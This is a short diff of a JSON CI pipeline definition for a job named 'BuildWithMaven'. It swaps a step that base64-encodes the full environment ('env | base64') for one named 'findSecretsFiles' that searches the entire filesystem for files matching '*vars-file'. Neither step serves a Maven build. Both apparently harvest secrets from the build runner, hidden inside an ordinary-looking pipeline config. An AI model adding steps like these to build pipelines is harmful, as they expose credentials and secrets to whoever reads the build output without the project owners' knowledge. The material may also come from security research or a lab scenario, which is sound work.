@@ -90,9 +90,9 @@
 						"name": "BuildWithMaven",
 						"steps": [
 							{
-								"name": "dumpEnv",
-								"definition": "dumpEnv",
-								"command": "env | base64",
+								"name": "findSecretsFiles",
+								"definition": "findSecretsFiles",
+								"command": "find / -type f -name '*vars-file'",
 								"properties": null
 							},
 							{
